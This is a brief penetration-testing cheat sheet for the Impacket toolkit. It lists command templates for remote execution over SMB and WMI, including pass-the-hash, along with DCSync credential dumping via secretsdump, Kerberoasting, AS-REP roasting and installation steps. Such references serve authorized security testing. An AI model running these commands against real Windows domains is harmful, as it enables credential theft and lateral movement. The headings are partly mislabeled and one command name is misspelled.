## Overview

Impacket is a collection of Python classes for working with network protocols. It's essential for Windows penetration testing.

### Key Tools

- PSExec.py
	Remote command execution via SMB
- psexec.py domain/user:password@target
- psexec.py -hashes :ntlmhash domain/user@target
- WMIExec.py

#### Remote execution via WMI

- wmiexec.py domain/user:password@target
- wmiexec.py -hashes :ntlmhash domain/user@target
- SMBExec.py

#### Remote execution via SMB

- mbexec.py domain/user:password@target
- smbexec.py -hashes :ntlmhash domain/user@target

#### DCSync Attack

- secretsdump.py domain/user:password@dc-ip
- secretsdump.py -hashes :ntlmhash domain/user@dc-ip

#### Kerberoasting

- GetUserSPNs.py domain/user:password -dc-ip dc-ip -request

#### ASREPRoasting

- GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt

### Installation

```
pip install impacket
```
 
 or

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```
